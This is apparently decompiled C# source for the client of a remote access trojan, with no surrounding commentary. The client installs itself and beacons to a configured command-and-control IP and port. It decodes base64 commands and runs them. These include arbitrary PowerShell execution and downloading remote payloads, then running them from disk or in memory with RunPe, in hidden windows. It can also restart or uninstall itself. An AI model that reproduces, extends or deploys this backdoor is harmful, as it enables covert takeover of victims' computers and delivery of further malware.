using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client;

public static class ClientSocket
{
	private static Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	private static readonly int delay = Convert.ToInt32(Helper.delay);

	private static readonly int port = Convert.ToInt32(Helper.port);

	private static IPAddress ipAddress = IPAddress.Parse(Helper.ip);

	private static readonly Mutex singleton = new Mutex(initiallyOwned: true, Helper.mutex);

	private static void Main()
	{
		if (Helper.mutex != "" && Helper.mutex != "AAp7XlGwSI4rDD" && !singleton.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			Console.WriteLine("\nMutex USED.");
			Environment.Exit(-1);
		}
		Helper.Install();
		while (true)
		{
			if (!clientSocket.Connected)
			{
				makeConnection();
			}
			else
			{
				receiveInfo();
			}
		}
	}

	private static void makeConnection()
	{
		while (!clientSocket.Connected)
		{
			try
			{
				clientSocket.Connect(new IPEndPoint(ipAddress, port));
				Thread.Sleep(delay);
			}
			catch (SocketException)
			{
			}
		}
	}

	private static void receiveInfo()
	{
		byte[] array = new byte[4096];
		int num = 0;
		try
		{
			num = clientSocket.Receive(array);
		}
		catch (SocketException)
		{
			clientSocket.Close();
			clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			makeConnection();
		}
		if (num != 0)
		{
			byte[] array2 = new byte[num];
			Array.Copy(array, array2, num);
			string cmd = "";
			try
			{
				cmd = Encoding.ASCII.GetString(array2);
				cmd = Helper.Decrypt(cmd);
			}
			catch
			{
			}
			Task task = new Task(delegate
			{
				ProcessRequest(cmd);
			});
			task.Start();
		}
	}

	private static void ProcessRequest(string data)
	{
		//IL_0240: Unknown result type (might be due to invalid IL or missing references)
		Console.WriteLine(data);
		if (data.StartsWith("Info:"))
		{
			Console.WriteLine(Helper.Idmsg());
			Send("Info:" + Helper.Idmsg());
			return;
		}
		switch (data.Split(new char[1] { '|' })[0])
		{
		default:
			Console.WriteLine("wut>" + data);
			break;
		case "SRV":
			switch (data.Split(new char[1] { '|' })[1])
			{
			case "Download":
			{
				byte[] bytes = null;
				try
				{
					using (WebClient webClient = new WebClient())
					{
						bytes = Convert.FromBase64String(webClient.DownloadString(data.Split(new char[1] { '|' })[3]));
					}
					if (data.Split(new char[1] { '|' })[2] == "Disk")
					{
						string text = Path.GetTempFileName() + ".exe";
						File.WriteAllBytes(text, bytes);
						Exec(text);
						break;
					}
					if (data.Split(new char[1] { '|' })[2] == "Ram")
					{
						Helper.RunPe(bytes);
						break;
					}
					string text2 = Path.GetTempFileName() + ".exe";
					File.WriteAllBytes(text2, bytes);
					Process.Start(new ProcessStartInfo
					{
						Arguments = "/C /T 5 & start \"" + text2 + "\"",
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = "cmd.exe"
					});
					Helper.UnInstall();
					break;
				}
				catch
				{
					Send("[" + Helper.HWID() + "] - Error: " + data);
					break;
				}
			}
			case "Restart":
				Helper.Restart();
				break;
			case "Uninstall":
				Helper.UnInstall();
				break;
			}
			break;
		case "Site":
			Process.Start(data.Split(new char[1] { '|' })[1]);
			break;
		case "MSGBox":
			MessageBox.Show(data.Split(new char[1] { '|' })[1]);
			break;
		case "CMD":
			Exec(data.Split(new char[1] { '|' })[1]);
			break;
		}
	}

	public static void Exec(string cmd)
	{
		new Task(delegate
		{
			using Process process = new Process();
			process.StartInfo.FileName = "powershell.exe";
			process.StartInfo.Arguments = "/c powershell " + cmd;
			process.Start();
		}).Start();
	}

	public static string Decrypt(string data)
	{
		byte[] bytes = Convert.FromBase64String(data);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void Send(string data)
	{
		try
		{
			string s = Helper.Encrypt(data);
			byte[] bytes = Encoding.ASCII.GetBytes(s);
			clientSocket.Send(bytes);
		}
		catch (Exception)
		{
			clientSocket.Connect(new IPEndPoint(ipAddress, port));
			makeConnection();
		}
	}
}
